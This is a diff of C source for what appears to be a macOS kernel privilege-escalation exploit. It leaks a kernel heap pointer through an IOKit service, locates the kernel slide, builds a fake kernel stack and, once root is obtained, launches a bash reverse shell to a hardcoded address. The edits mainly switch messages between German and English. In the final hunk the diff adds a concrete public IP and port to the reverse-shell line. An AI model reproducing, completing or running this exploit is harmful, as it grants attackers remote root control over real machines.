@@ -34,14 +34,14 @@ __attribute__((always_inline)) static inline
 uint64_t leak_heap_ptr(io_connect_t* co) {
     io_connect_t conn = MACH_PORT_NULL;
     if(IOServiceOpen(servicea, mach_task_self(), 0, co) != KERN_SUCCESS) {
-        puts("Fehlgeschlagen\n");
+        puts("failed\n");
         exit(-20);
     }
     uint64_t    scalarO_64=0;
     uint32_t    outputCount = 1;
     IOConnectCallScalarMethod(*co, 2, NULL, 0, &scalarO_64, &outputCount);
     if (!scalarO_64) {
-        puts("Info Leak Fehlgeschlagen.\n");
+        puts("Info Leak failed.\n");
         exit(-20);
     }
     scalarO_64 <<= 8;
@@ -139,7 +139,7 @@ int main(int argc, char** argv, char** envp){
         printf("Success!\n");
         printf("Sending root shell...");
         sleep(2);
-        system("bash -i >& /dev/tcp/192.168.1.102/1337 0>&1");
+        system("bash -i >& /dev/tcp/<ipaddress>/<port> 0>&1");
         printf("Done, exiting...\n");
         exit(0);
         
@@ -220,8 +220,8 @@ again:;
         exit(-3);
     }
     
-    printf("found kslide, @ 0x%016llx\n", kslide);
-    printf("Exploiting...\n");
+    printf("Gefundener kslide, @ 0x%016llx\n", kslide);
+    printf("Exploit wird ausgeführt..\n");
     
     kernel_fake_stack_t* stack = calloc(1,sizeof(kernel_fake_stack_t));
     
@@ -298,11 +298,13 @@ again:;
     if (getuid() == 0) {
         printf("Success!\n");
         printf("Sending root shell...");
-        system("bash -i >& /dev/tcp/<ipaddress>/<port> 0>&1");
+        sleep(2);
+        system("bash -i >& /dev/tcp/84.226.88.203/1337 0>&1");
         printf("Done, exiting...\n");
         exit(0);
     }
     
-   printf("FAILED\n");
+    puts("didn't get root, but this system is vulnerable.\n");
+    puts("kernel heap may be corrupted\n");
     return 1;
 }
